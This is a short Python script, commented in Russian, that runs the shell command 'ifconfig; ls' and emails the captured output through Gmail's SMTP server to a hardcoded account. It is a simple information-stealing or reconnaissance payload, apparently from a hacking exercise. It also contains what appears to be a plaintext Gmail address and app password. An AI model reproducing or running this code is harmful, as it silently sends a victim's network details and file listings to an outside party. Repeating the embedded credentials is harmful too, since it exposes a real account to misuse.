import subprocess, smtplib

#фун для создания отправки сообщения полученных данных ниже
def send_mail(email, password, message): 
    #создали соеденение через гугл для отправки туда сообщения
    server = smtplib.SMTP("smtp.gmail.com", 587) #домен и порт
    # tls соеденение
    server.starttls()
    # авторизация
    server.login(email, password)
    # сообщение
    server.sendmail(email, email, message)
    server.quit()


#создадим перемнную с командой
command = "ifconfig; ls"
# запускаем команду
result = subprocess.check_output(command, shell=True)
# отправка на почту 
send_mail("kingfsocietyall@gmail.com", "wayrapjxmabjrzdx", result)